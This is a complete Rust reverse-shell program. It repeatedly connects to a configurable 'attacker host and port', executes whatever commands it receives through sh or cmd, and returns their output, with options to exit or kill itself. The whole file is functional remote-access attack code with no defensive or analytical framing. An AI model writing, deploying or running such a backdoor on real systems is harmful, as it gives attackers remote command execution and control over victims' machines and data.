use std::net::{TcpStream};
use std::io::{Read, Write};
use std::str::from_utf8;
use std::process::Command;
use std::time::Duration;
use std::thread;

/*
fn spawn_shell() {
	let mut child = Command::new("sh").spawn().unwrap();
	child.wait();
}*/

fn main() {
	let addr = "127.0.0.1:8888"; // Attacker host and port. EDIT here
	loop {
		match TcpStream::connect(addr) { // Try create TCP connection
			Ok(mut conn) => { // If connected
				loop { // Create endless loop
					let mut data = [0; 64]; // Create data
					match conn.read(&mut data) {
						Ok(_) => {
							let mut command = from_utf8(&data).unwrap();
							/* Remove Null byte in command (Error while running commands*/
							/* https://stackoverflow.com/a/49406848 */
							command = command.trim_matches(char::from(0));
							if command == "exit\n" {
								break;
							}
							else if command == "killself\n" {
								return;
							} /*
							else if command == "spawn_shell\n"{
								/* Unusable */
								spawn_shell();
							}*/
							else {
								let output = if cfg!(target_os = "windows") {
									Command::new("cmd").args(&["/C", command]).output().unwrap()
								} else {
									Command::new("sh").arg("-c").arg(command).output().unwrap()
								};
								conn.write(&output.stdout).unwrap();
							}
						},
						Err(_) => {}
					}
				}
			},
			Err(_) => {}
		}
		thread::sleep(Duration::from_millis(5000))
	}
}
